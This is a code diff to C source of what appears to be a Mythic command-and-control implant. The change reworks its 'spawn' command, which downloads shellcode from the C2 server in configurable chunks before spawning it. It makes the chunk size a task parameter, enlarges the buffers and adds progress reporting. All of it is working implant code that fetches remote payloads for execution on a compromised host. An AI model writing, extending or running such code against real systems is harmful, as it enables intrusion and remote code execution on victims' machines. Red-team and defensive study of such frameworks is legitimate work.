@@ -67,7 +67,7 @@ void command_spawnto(char *task_id, char *params) {
 /* ------------------------------------------------------------------ */
 #ifdef INCLUDE_CMD_SPAWN
 
-#define SPAWN_CHUNK_SIZE (512 * 1024)
+#define SPAWN_CHUNK_SIZE (4 * 1024 * 1024)
 
 static char *spawn_extract_b64(const char *json, const char *key) {
     char pat[72];
@@ -126,9 +126,14 @@ static int spawn_md5_hex(const unsigned char *data, size_t len, char out[33]) {
 void command_spawn(char *task_id, char *params) {
     char file_id[128]      = {0};
     char expected_md5[64]  = {0};
+    int  sc_chunk_size     = SPAWN_CHUNK_SIZE;
 
     extract_json_string(params, "file",         file_id,      sizeof(file_id));
     extract_json_string(params, "shellcode_md5", expected_md5, sizeof(expected_md5));
+    {
+        int v = spawn_extract_int(params, "sc_chunk_size", 0);
+        if (v > 0) sc_chunk_size = v;
+    }
 
     if (!file_id[0]) {
         send_task_response(task_id, "Error: no shellcode file provided");
@@ -142,16 +147,22 @@ void command_spawn(char *task_id, char *params) {
     int            chunk_num     = 1;
 
     while (1) {
-        char json_msg[1024];
-        /* chunk_size must be sent in every request so Mythic uses a consistent
-         * offset (seek = (chunk_num-1) * chunk_size). Omitting it causes Mythic
-         * to fall back to its built-in default (512000), which differs from
-         * SPAWN_CHUNK_SIZE and produces overlapping / missing byte ranges. */
-        snprintf(json_msg, sizeof(json_msg),
-            "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
-            "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
-            "\"chunk_num\":%d,\"full_path\":\"<spawn>\"}}]}",
-            task_id, SPAWN_CHUNK_SIZE, file_id, chunk_num);
+        char json_msg[2048];
+        if (chunk_num == 1 || total_chunks <= 0) {
+            snprintf(json_msg, sizeof(json_msg),
+                "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+                "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+                "\"chunk_num\":%d,\"full_path\":\"<spawn>\"}}]}",
+                task_id, sc_chunk_size, file_id, chunk_num);
+        } else {
+            snprintf(json_msg, sizeof(json_msg),
+                "{\"action\":\"post_response\",\"responses\":[{\"task_id\":\"%s\","
+                "\"status\":\"Downloading shellcode: chunk %d / %d\","
+                "\"upload\":{\"chunk_size\":%d,\"file_id\":\"%s\","
+                "\"chunk_num\":%d,\"full_path\":\"<spawn>\"}}]}",
+                task_id, chunk_num, total_chunks,
+                sc_chunk_size, file_id, chunk_num);
+        }
 
         char *b64_resp = send_c2_message(json_msg);
         if (!b64_resp) {
